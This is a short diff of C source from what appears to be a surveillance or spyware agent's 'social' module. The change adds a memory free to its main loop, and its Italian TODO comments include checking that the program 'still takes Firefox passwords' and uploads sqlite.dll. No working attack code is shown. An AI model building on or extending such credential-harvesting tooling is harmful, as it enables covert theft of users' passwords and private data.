@@ -12,7 +12,7 @@
 // - Implementare CONFOK per evitare che mi venga rimandata sempre!
 // - Verificare che mi uploadi sqlite.dll
 // - Far mettere "social" come agente nella conf
-//
+// - Verificare che prenda ancora le password di firefox
 //
 /////////////// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
 
@@ -177,6 +177,7 @@ void SocialMainLoop()
 						ret = social_entry[i].RequestHandler(str);
 					 else
 						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
+					SAFE_FREE(str);
 
 					if (ret == SOCIAL_REQUEST_SUCCESS) {
 						social_entry[i].idle = SOCIAL_LONG_IDLE;
